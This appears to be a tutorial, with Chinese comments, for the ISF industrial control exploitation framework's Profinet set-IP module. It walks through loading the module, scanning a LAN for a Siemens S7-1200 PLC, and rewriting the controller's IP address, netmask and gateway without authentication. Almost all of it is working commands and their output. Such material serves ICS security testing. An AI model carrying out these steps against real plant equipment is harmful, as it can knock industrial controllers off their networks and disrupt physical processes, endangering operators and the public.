# Profinet set ip

# 使用 Profinet set ip module
    root@kali:~/Desktop/temp/isf# python isf.py
    
      _____ _____  _____ _____ _____  _      ____ _____ _______
     |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
       | || |    | (___| (___ | |__) | |   | |  | || |    | |
       | || |     \___ \\___ \|  ___/| |   | |  | || |    | |
      _| || |____ ____) |___) | |    | |___| |__| || |_   | |
     |_____\_____|_____/_____/|_|    |______\____/_____|  |_|
    
    
                    ICS Exploitation Framework
    
    Note     : ICSSPOLIT is fork from routersploit at
               https://github.com/reverse-shell/routersploit
    Dev Team : wenzhe zhu(dark-lbp)
    Version  : 0.1.0
    
    Exploits: 5 Scanners: 3 Creds: 13
    
    ICS Exploits:
        PLC: 5          ICS Switch: 0
        Software: 0
    
    isf >
    isf > search profinet
    exploits/plcs/siemens/profinet_set_ip
    scanners/profinet_dcp_scan
    isf > exploits/plcs/siemens/profinet_set_ip
    isf (profinet device ip setup) >

    
# 设置参数
    isf (profinet device ip setup) > show options
    Target options:
    
       Name       Current settings      Description
       ----       ----------------      -----------
       target     40:6c:8f:ff:ff:ff     Target mac address, e.g. 40:6c:8f:ff:ff:ff
    
    
    Module options:
    
       Name               Current settings     Description
       ----               ----------------     -----------
       timeout            3                    Timeout for response
       target_ip          192.168.1.100        IP Address to set
       nic                eth0                 Interface Name e.g eth0, en0
       target_gateway     0.0.0.0              Gateway to set
       target_netmask     255.255.255.0        Network mask to set
       verbose            0                    Scapy verbose level, 0 to 2
    
    # 由于Profinet dcp是以太网层的协议，因此我们首先需要设置使用哪个网口来发送和接收数据包。
    isf (profinet device ip setup) > set nic eth0
    [+] {'nic': 'eth0'}
    
    # 设置目标对象的mac地址, 
    isf (profinet device ip setup) > set target 00:1c:06:1d:ff:ff
    [+] {'target': '00:1c:06:1d:ff:ff'}
    
    # 若此时不知道对象的mac地址是多少，可以使用scan命令来进行局域网设备探测
    isf (profinet device ip setup) > scan
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.100  255.255.255.0  0.0.0.0
    
    # 设置需要修改的IP地址，子网掩码及网关参数
    isf (profinet device ip setup) > set target_ip 192.168.1.110
    [+] {'target_ip': '192.168.1.110'}
    isf (profinet device ip setup) > set target_netmask 255.255.255.0
    [+] {'target_netmask': '255.255.255.0'}
    # 如果目标不需要配置网关则可以填写0.0.0.0
    isf (profinet device ip setup) > set target_gateway 0.0.0.0
    [+] {'target_gateway': '0.0.0.0'}

# 执行module
    isf (profinet device ip setup) > run
    # 执行命令run后将会针对目标发送profinet检测包，检测当前配置
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.100  255.255.255.0  0.0.0.0
    
    
    [*] Please make sure target device info is correct.
    [*] Do you want setup target with
     ip address: 192.168.1.110
     network mask: 255.255.255.0
     gateway:0.0.0.0
    
    Y/y to confirm, other to cancel.
    输入Y或y后将会对目标的ip配置参数进行修改
    :y
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.110  255.255.255.0  0.0.0.0
    
    
    [+] Setup target ip succeed
    isf (profinet device ip setup) >
